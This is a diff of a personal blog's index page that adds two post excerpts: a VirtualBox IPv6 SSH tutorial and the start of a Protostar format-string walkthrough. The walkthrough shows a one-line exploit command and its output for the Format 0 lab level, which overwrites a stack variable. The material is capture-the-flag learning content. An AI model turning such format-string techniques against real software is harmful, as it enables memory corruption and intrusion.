@@ -7,8 +7,7 @@
 	<meta name="author" content="Louis Li">
 
 	
-	<meta name="description" content="exploits, projects Protostar Stack Exploits (Solutions 6-7) Overview
-Protostar is a series of exercises from Exploit Exercises. In addition to three &hellip;">
+	<meta name="description" content="tutorial Enabling VirtualBox SSH on IPv6 (Linux Host, Linux Guest) This is a quick article describing how to SSH to a VirtualBox machine from the &hellip;">
 	
 
   <!-- http://t.co/dKP3o1e -->
@@ -99,6 +98,95 @@ Protostar is a series of exercises from Exploit Exercises. In addition to three 
 			<div class="mid-col-container">
 				<div id="content" class="inner"><div class="blog-index">
   
+  
+  
+    <article>
+      
+	<div class="meta">
+		<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-08-30T00:00:00+02:00" data-updated="true" itemprop="datePublished"></time></div>
+		<div class="tags">
+
+
+	<a class='category' href='/blog/categories/tutorial/'>tutorial</a>
+
+
+</div>
+		
+	</div>
+	<h1 class="title" itemprop="name"><a href="/blog/2012/08/30/virtualbox-ipv6-ssh/" itemprop="url">Enabling VirtualBox SSH on IPv6 (Linux Host, Linux Guest)</a></h1>
+	<div class="entry-content" itemprop="articleBody">
+		<p>This is a quick article describing how to SSH to a VirtualBox machine from the host machine, written for VirtualBox 4.1.18 Fedora. The standard choice – bridged networking – doesn’t work when the host has an IPv6 address.</p>
+
+
+		
+		<a href="/blog/2012/08/30/virtualbox-ipv6-ssh/" class="more-link">Read more</a>
+	</div>
+
+
+    </article>
+  
+  
+    <article>
+      
+	<div class="meta">
+		<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-08-29T00:00:00+02:00" data-updated="true" itemprop="datePublished"></time></div>
+		<div class="tags">
+
+
+	<a class='category' href='/blog/categories/exploits/'>exploits</a>, <a class='category' href='/blog/categories/projects/'>projects</a>
+
+
+</div>
+		
+	</div>
+	<h1 class="title" itemprop="name"><a href="/blog/2012/08/29/protostar-format0/" itemprop="url">Protostar Format String Exploits (Solutions 0-4)</a></h1>
+	<div class="entry-content" itemprop="articleBody">
+		<h1 id="overview">Overview</h1>
+<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>
+
+<p>This post contains solutions and walkthroughs for the four format string levels (“Format”).</p>
+
+<h1 id="solutions">Solutions</h1>
+<p>## Format: Level 0
+<strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format0">full</a>): Change the value of a stack variable to <code>0xdeadbeef</code> using less than 10 bytes of input.</p>
+
+<p>This exploit shows similarities (sometimes) between format string exploits and buffer overflows.</p>
+
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> ./format0 %64s<span class="k">$(</span>perl -e <span class="s1">&#39;print &quot;\xef\xbe\xad\xde&quot;&#39;</span><span class="k">)</span>
+
+<span class="go">you have hit the target correctly :)</span></code></pre></div>
+
+
+		
+		<a href="/blog/2012/08/29/protostar-format0/" class="more-link">Read more</a>
+	</div>
+
+
+    </article>
   
   
     <article>
